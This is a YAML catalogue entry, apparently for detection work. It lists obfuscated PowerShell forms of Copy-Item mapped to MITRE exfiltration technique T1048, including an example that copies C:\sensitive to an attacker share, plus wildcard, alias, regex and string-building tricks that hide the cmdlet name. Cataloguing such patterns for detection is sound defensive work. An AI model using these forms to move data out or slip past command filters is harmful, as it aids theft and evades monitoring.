---
Name: Copy-Item
Description: "Copy files and directories. Used for staging payloads, copying sensitive data for exfiltration, or lateral file movement."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet"
Category: exfiltration
MitreID: T1048
Patterns:
  - Pattern: "& (gcm C*-I*m) -Path C:\\sensitive -Destination \\\\attacker\\share"
    Wildcards: ["*"]
    Notes: "Wildcards in both verb and noun"
  - Pattern: "& (gcm Copy-It*) -Path ..."
    Wildcards: ["*"]
    Notes: "Star matches 'em'"
  - Pattern: "& (gcm C?py-Item) -Path ..."
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'o'"
  - Pattern: "& (gcm C[n-p]py-Item) -Path ..."
    Wildcards: ["[n-p]"]
    Notes: "Character range matches 'o' in Copy"
  - Pattern: "copy -Path src -Destination dst"
    Wildcards: []
    Notes: "Alias 'copy' for Copy-Item"
  - Pattern: "cp -Path src -Destination dst"
    Wildcards: []
    Notes: "Alias 'cp' for Copy-Item"
  - Pattern: "cpi -Path src -Destination dst"
    Wildcards: []
    Notes: "Alias 'cpi' for Copy-Item"
  - Pattern: "& (gal cp?) -Path src -Destination dst"
    Wildcards: ["?"]
    Notes: "Get-Alias with wildcard resolves 'cpi' — cp? avoids matching 'cli' (Clear-Item)"
  - Pattern: "& (gcm *-Item) -Path ..."
    Wildcards: ["*"]
    Notes: "Prefix wildcard — note: matches Get-Item, Set-Item etc."
  - Pattern: "& (DIR Alias:/cp?) -Path src -Destination dst"
    Wildcards: ["?"]
    Notes: "Resolves cpi alias via PowerShell's Alias: PSDrive glob — cp? matches cpi (not cp, which is 2 chars)"
  - Pattern: "& (gcm * | ? Name -match '^Co.*Item') -Path src -Destination dst"
    Wildcards: ["-match"]
    Notes: "Regex -match filter on all commands via Where-Object pipeline — regex alternative to glob wildcards"
  - Pattern: "& (gcm ('{0}-{1}' -f 'Copy','Item')) -Path src -Destination dst"
    Wildcards: []
    Notes: "-f format operator constructs 'Copy-Item' from string fragments before gcm resolves it"
    Method: "-f format operator"
  - Pattern: "& (gcm ('Copy'+''+'-Item')) -Path src -Destination dst"
    Wildcards: []
    Notes: "String concatenation builds the cmdlet name from literals — name never appears contiguous in source"
    Method: "String concatenation"
Resources:
  - https://attack.mitre.org/techniques/T1048/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item
---
